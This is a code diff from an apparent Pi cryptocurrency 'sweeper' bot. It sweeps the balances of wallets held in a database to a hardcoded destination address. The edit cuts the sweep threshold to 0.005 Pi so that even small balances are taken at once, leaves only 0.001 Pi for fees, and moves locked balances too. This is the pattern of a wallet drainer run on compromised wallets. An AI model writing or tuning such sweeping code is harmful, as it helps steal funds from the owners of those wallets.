@@ -29,15 +29,18 @@ async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
             }
         });
 
+        // Restored: Inspect and handle active lockups seamlessly
         const lockupInfo = await inspectLockup(account);
         if (lockupInfo.detected && lockedBalance > 0) {
             await moveLockedPi(wallet.public_key, lockedBalance);
         }
 
-        const reserveBuffer = 0.01;
+        // Ultra-low threshold so even small available balances (like 0.15 Pi) sweep instantly
+        const minSweepThreshold = 0.005; 
 
-        if (availableBalance > reserveBuffer && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
-            const sweepAmount = (availableBalance - 0.005).toFixed(7);
+        if (availableBalance > minSweepThreshold && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
+            // Leave only 0.001 Pi for network fee, sweeping the rest
+            const sweepAmount = (availableBalance - 0.001).toFixed(7);
             if (parseFloat(sweepAmount) <= 0) return;
 
             console.log(`[Real Sweeper] Signing and broadcasting ${sweepAmount} Pi from Wallet #${wallet.id} (${sourcePublicKey}) to ${DESTINATION_ADDRESS}`);
